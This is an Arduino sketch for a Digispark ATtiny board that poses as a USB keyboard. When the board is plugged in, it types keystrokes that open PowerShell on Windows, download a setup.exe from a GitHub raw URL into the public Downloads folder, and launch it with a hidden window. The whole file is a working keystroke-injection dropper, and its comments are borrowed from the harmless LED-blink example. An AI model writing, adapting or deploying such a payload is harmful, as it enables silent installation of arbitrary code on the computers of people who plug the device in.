#include <DigiKeyboard.h>

// the setup routine runs once when you press reset:
void setup() {                
  // initialize the digital pin as an output.
  pinMode(1, OUTPUT); //LED on Model A   

  DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_X,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_I);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("Invoke-WebRequest -uri 'https://raw.githubusercontent.com/divie/ATTINY-Install/main/setup.exe' -OutFile 'C:/Users/Public/Downloads/setup.exe' -UseBasicParsing");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("Start-Process -WindowStyle hidden C:/Users/Public/Downloads/setup");
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);     // turn the LED on (HIGH is the voltage level)
}

// the loop routine runs over and over again forever:
void loop() {   

}